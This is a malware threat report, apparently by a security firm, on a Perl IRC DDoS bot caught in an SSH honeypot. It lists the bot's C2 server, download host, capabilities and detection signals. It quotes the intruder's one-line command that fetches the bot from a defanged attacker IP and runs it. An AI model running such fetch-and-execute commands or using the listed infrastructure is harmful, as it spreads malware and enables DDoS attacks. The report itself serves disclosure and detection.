# PerlBot "Dred": a PBot-derived IRC DDoS bot and its C2

**KSI Digital threat research | 2026-10-05 | observed 2026-10-03**

A Perl IRC flood bot landed in our Cowrie SSH honeypot. The sample and its download URL were already on public feeds, but its **hard-coded IRC C2 was not**. We reported the C2; this note records the full profile.

Indicators: [`iocs.csv`](iocs.csv).

## Observation

On 2026-10-03 (09:47-09:53 UTC) an actor logged in to the SSH honeypot as root and ran, nine times:

```
uname -a; lspci | grep -i vga ...; curl -s -L hxxp://192.227.210[.]190/dred -o /tmp/dred; perl /tmp/dred
```

The fetched sample `dred` (44,755 bytes) is **"DDoS Perl IrcBot v2.0"**, a rebrand of the public Romanian-scene "PBot" (its greeting string is `Pregatit de actiune!`). The operator nick is **Dred**.

## Profile (static analysis)

- **C2:** IRC server `23.95.235[.]108:6667`, channel `#new`, admin nick `Dred`.
- Vhost string `dreds.network` and an UnrealIRCd host-cloak; `dreds.network` is **unregistered (NXDOMAIN)**, so it is an IRC cloak, not a resolvable domain IOC.
- **Behaviour:** forks, renames `$0`, ignores `INT`/`HUP`/`TERM`, `chdir /tmp`, no persistence (dies on reboot).
- **Capabilities:** UDP / TCP / HTTP / IRC floods, port scan, reverse shell (`cback`), file download, mail spam, raw shell.
- **C2 host** `23.95.235[.]108` (ColoCrossing, sub-allocated to "VPS ACE"): exposed ports include 6667 and 6697 (IRC + TLS).
- **Download host** `192.227.210[.]190` (ColoCrossing): on URLhaus since 2026-09-21.

The C2 was identified from the sample's configuration only; we did not join the IRC server.

## Indicators

| Indicator | Role |
| --- | --- |
| `23.95.235[.]108:6667` | IRC C2 (channel `#new`) -> ThreatFox 1948443 (KSI Digital) |
| `hxxp://192.227.210[.]190/dred` | download URL (URLhaus 3920026) |
| `a37649842a47b845...` | sample "DDoS Perl IrcBot v2.0" (44,755 B), on MalwareBazaar |

## Detection ideas

Ready-to-use rules are in [`detection/`](detection/). The signals they encode:

- Outbound TCP to `:6667`/`:6697` from a server that has no business on IRC.
- A Perl process running from `/tmp` whose argv has been renamed, spawned right after `curl .../dred`.
- The literal strings `Pregatit de actiune!` or `DDoS Perl IrcBot` in files or memory.

## Reporting status

ThreatFox: `23.95.235[.]108:6667` (botnet_cc, elf.perlbot; KSI Digital 2026-10-03, id 1948443). Sample and download URL were already on MalwareBazaar / URLhaus (credited to their original reporters); the IRC C2 was the gap.

Contact: christophe@ksi-digital.com | abuse.ch `@ksi_digital` | Licensed [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/)
